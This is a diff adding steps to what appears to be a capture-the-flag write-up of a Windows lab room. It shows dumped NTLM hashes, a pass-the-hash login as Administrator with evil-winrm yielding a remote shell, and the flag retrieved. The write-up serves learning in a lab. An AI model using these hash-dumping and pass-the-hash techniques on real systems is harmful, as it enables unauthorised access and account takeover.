@@ -120,6 +120,21 @@ thmuser0:1011:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:
 thmuser4:1013:aad3b435b51404eeaad3b435b51404ee:8767940d669d0eb618c15c11952472e5:::
 [*] Cleaning up... 
 ```
+17. `evil-winrm -i {TARGET IP} -u Administrator -H {PASSWORD HASH}`
+```Bash
+root@ip-10-10-72-227:~# evil-winrm -i 10.10.41.253 -u Administrator -H f3118544a831e728781d780cfdb9c1fa
+
+Evil-WinRM shell v2.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> 
+```
+18. `C:\flags\flag1.exe`
+```Bash
+*Evil-WinRM* PS C:\Users\Administrator\Documents> C:\flags\flag1.exe
+THM{FLAG_BACKED_UP!}
+```
 
 # Assigning Specific Privileges Using Security Descriptors
 
